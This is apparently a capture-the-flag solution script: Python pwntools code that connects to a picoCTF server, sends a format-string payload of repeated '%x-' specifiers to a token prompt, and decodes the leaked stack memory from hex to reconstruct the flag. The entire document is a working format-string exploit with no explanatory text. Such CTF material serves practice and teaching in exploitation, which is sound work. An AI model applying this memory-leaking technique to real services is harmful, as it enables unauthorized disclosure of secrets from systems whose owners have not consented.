from pwn import *

p = remote("mercury.picoctf.net",20195)

p.recvuntil("portfolio")
p.sendline('1')
p.recvuntil("token?")

string = "%x-"*30
p.sendline(string)

p.recvuntil("token:\n")
tmp = p.recvline().decode("utf-8")

tmp = tmp.split('-')
flag = ""

for data in tmp:
	try:
		data = bytearray.fromhex(data).decode()[::-1]
		flag+=data
	except:
		continue	

print(tmp)
print(flag)
